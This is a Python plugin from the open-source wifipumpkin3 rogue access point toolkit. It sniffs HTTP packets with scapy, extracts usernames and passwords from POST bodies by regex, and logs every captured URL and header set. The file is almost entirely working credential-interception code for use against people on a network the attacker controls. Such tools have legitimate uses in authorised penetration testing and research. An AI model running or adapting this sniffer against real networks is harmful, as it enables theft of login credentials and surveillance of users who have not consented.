from scapy.all import *
import scapy.layers.http as http
from wifipumpkin3.plugins.sniffkin3.default import PSniffer
import re
from wifipumpkin3.core.common.platforms import decoded

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class MonitorCreds(PSniffer):
    _activated = False
    _instance = None
    meta = {
        "Name": "httpCap",
        "Version": "1.0",
        "Description": "capture urls and creds realtime http requests",
        "Author": "Pumpkin-Dev",
    }

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value

    @staticmethod
    def getInstance():
        if MonitorCreds._instance is None:
            MonitorCreds._instance = MonitorCreds()
        return MonitorCreds._instance

    def getCredentials_POST(self, payload, url, dport, sport, pkt):
        user_regex = (
            "([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|"
            "[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)"
        )
        pw_regex = (
            "([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|"
            "[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)"
        )
        username = re.findall(user_regex, str(payload, "utf-8"))
        password = re.findall(pw_regex, str(payload, "utf-8"))
        if not username == [] and not password == []:
            data = {
                "POSTCreds": {
                    "Url": str(url),
                    "Destination": "{}/{}".format(sport, dport),
                    "Packets": pkt,
                    "Data": {
                        "User": username[0][1],
                        "Pass": password[0][1],
                        "Payload": payload,
                    },
                }
            }
            with decoded(data) as data_decoded:
                self.output.emit(data_decoded)

    def get_http_POST(self, load):
        dict_head = {}
        try:
            headers, body = load.split("\r\n\r\n", 1)
            header_lines = headers.split("\r\n")
            for item in header_lines:
                try:
                    dict_head[item.split()[0]] = item.split()[1]
                except Exception:
                    pass
            if "Referer:" in dict_head.keys():
                return dict_head, dict_head["Referer:"]
        except ValueError:
            return None, None
        return dict_head, None

    def filterPackets(self, pkt):
        if not pkt.haslayer(http.HTTPRequest):
            return
        try:
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.dport = pkt[TCP].dport
                self.sport = pkt[TCP].sport
                self.src_ip_port = str(pkt[IP].src) + ":" + str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst) + ":" + str(self.dport)

            http_layer = pkt.getlayer(http.HTTPRequest)
            ip_layer = pkt.getlayer(IP)
            if str(http_layer.fields["Method"], "utf-8") == "POST":
                self.getCredentials_POST(
                    pkt.getlayer(Raw).load,
                    http_layer.fields["Host"],
                    self.dst_ip_port,
                    self.src_ip_port,
                    {"IP": ip_layer.fields, "Headers": http_layer.fields},
                )
            data = {"urlsCap": {"IP": ip_layer.fields, "Headers": http_layer.fields}}
            with decoded(data) as data_decoded:
                self.output.emit(data_decoded)
        except:
            pass

    def random_char(self, y):
        return "".join(random.choice(string.ascii_letters) for x in range(y))
